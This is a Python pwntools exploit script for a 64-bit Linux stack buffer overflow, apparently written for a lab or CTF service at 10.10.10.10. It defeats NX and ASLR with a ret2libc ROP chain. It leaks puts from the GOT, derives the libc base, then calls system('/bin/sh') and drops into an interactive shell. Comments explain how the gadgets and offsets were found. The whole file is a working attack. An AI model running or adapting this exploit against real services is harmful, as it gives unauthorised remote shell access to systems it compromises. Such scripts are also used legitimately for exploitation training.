#!/usr/bin/env python3
# Linux Buffer Overflow 64 bits NX & ASLR Enabled

# Checksec

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# /proc/sys/kernel/randomize_va_space 2

from pwn import *

# context(log_level='DEBUG')
p = remote("10.10.10.10", 9999)

junk = b"A"*40

ret      = p64(0x4010ef) # ropper --file pwn --search "% ret" # 0x00000000004010ef: nop; ret; # Ubuntu stack alignment, bypass movaps
pop_rdi  = p64(0x4012a3) # ropper --file pwn --search "% rdi" # 0x00000000004012a3: pop rdi; ret;
puts_got = p64(0x404018) # objdump -D pwn | grep puts ## 404018 <puts@GLIBC_2.2.5>
puts_plt = p64(0x401060) # objdump -D pwn | grep puts # call   401060 <puts@plt>
main     = p64(0x4011f2) # obobjdump -D pwn | grep main # 00000000004011f2 <main>:

payload = junk + pop_rdi + puts_got + puts_plt + main

p.recv()
p.sendline(payload)
p.recv()
leaked_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(leaked_puts)=}")

# That address will be different each time, but the bottom 12 bits (or 1.5 bytes or 3 nibbles or 3 hex characters), in this case aa0, will be constant. I can look them up in something like this libc database: https://libc.nullbyte.cat/?q=puts%3Aaa0&l=libc6_2.27-3ubuntu1.3_amd64
    
# puts          0x080aa0        0x31550
# system        0x04f550        0x0
# str_bin_sh    0x1b3e1a        0x1648ca

libc_base = leaked_puts - 0x080aa0
log.info(f"{hex(libc_base)=}")

system = p64(0x04f550 + libc_base)
sh = p64(0x1b3e1a + libc_base)

payload = junk + ret + pop_rdi + sh + system

p.recv()
p.sendline(payload)

p.interactive()
